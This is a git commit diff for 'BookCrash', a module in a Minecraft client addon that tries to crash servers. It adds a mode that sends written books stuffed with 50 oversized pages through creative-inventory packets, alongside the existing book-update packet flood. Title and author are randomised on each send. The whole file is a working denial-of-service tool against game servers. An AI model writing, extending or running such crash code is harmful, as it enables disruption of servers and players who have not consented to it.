51aece189e69cfc77dd594c1105f5bd0ad4b41ff
Wide_Cat <thewidecat@gmail.com>
2021-08-07 16:58:39 +0100

    add a new mode to book crash, not sure how much difference it will make but why not

--- src/main/java/widecat/meteorcrashaddon/modules/BookCrash.java
+++ src/main/java/widecat/meteorcrashaddon/modules/BookCrash.java
@@ -1,12 +1,8 @@
 package widecat.meteorcrashaddon.modules;
 
-import io.netty.buffer.Unpooled;
 import meteordevelopment.meteorclient.events.game.GameLeftEvent;
 import meteordevelopment.meteorclient.events.world.TickEvent;
-import meteordevelopment.meteorclient.settings.BoolSetting;
-import meteordevelopment.meteorclient.settings.IntSetting;
-import meteordevelopment.meteorclient.settings.Setting;
-import meteordevelopment.meteorclient.settings.SettingGroup;
+import meteordevelopment.meteorclient.settings.*;
 import meteordevelopment.meteorclient.systems.modules.Module;
 import meteordevelopment.meteorclient.utils.Utils;
 import meteordevelopment.orbit.EventHandler;
@@ -14,21 +10,20 @@ import net.minecraft.item.ItemStack;
 import net.minecraft.item.Items;
 import net.minecraft.nbt.NbtList;
 import net.minecraft.nbt.NbtString;
-import net.minecraft.network.PacketByteBuf;
 import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
+import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
 import widecat.meteorcrashaddon.CrashAddon;
 
 import java.util.ArrayList;
 import java.util.Optional;
-import java.util.Random;
 
 public class BookCrash extends Module {
     private final SettingGroup sgGeneral = settings.getDefaultGroup();
 
-    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
-        .name("auto-disable")
-        .description("Disables module on kick.")
-        .defaultValue(true)
+    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
+        .name("mode")
+        .description("Which type of packet to send.")
+        .defaultValue(Mode.BookUpdate)
         .build()
     );
 
@@ -41,11 +36,16 @@ public class BookCrash extends Module {
         .build()
     );
 
+    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
+        .name("auto-disable")
+        .description("Disables module on kick.")
+        .defaultValue(true)
+        .build()
+    );
+
     public BookCrash() {
         super(CrashAddon.CATEGORY, "book-crash", "Tries to crash the server by sending bad book sign packets.");
     }
-
-    private final Random rand = new Random();
 
     @EventHandler
     private void onTick(TickEvent.Pre event) {
@@ -60,19 +60,41 @@ public class BookCrash extends Module {
     }
 
     private void sendBadBook() {
-        ItemStack book = new ItemStack(Items.WRITTEN_BOOK);
-        String title = "/stop";
-        String author = "MineGame159";
+        String title = "/stop" + Math.random() * 400;
         String mm255 = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
 
-        ArrayList<String> pages = new ArrayList<>();
+        switch (mode.get()) {
+            case BookUpdate -> {
+                ArrayList<String> pages = new ArrayList<>();
 
-        for (int i = 0; i < 50; i++) {
-            StringBuilder page = new StringBuilder();
-            page.append(mm255);
-            pages.add(page.toString());
+                for (int i = 0; i < 50; i++) {
+                    StringBuilder page = new StringBuilder();
+                    page.append(mm255);
+                    pages.add(page.toString());
+                }
+
+                mc.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(mc.player.getInventory().selectedSlot, pages, Optional.of(title)));
+            }
+            case CreativeAction -> {
+                ItemStack book = new ItemStack(Items.WRITTEN_BOOK);
+                String author = "MineGame159" + Math.random() * 400;
+                NbtList pageList = new NbtList();
+
+                for (int i = 0; i < 50; ++i) {
+                    pageList.addElement(i, NbtString.of(mm255));
+                }
+
+                book.putSubTag("title", NbtString.of(title));
+                book.putSubTag("author", NbtString.of(author));
+                book.putSubTag("pages", pageList);
+
+                mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(0, book));
+            }
         }
+    }
 
-        mc.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(mc.player.getInventory().selectedSlot, pages, Optional.of(title)));
+    public enum Mode {
+        BookUpdate,
+        CreativeAction
     }
 }
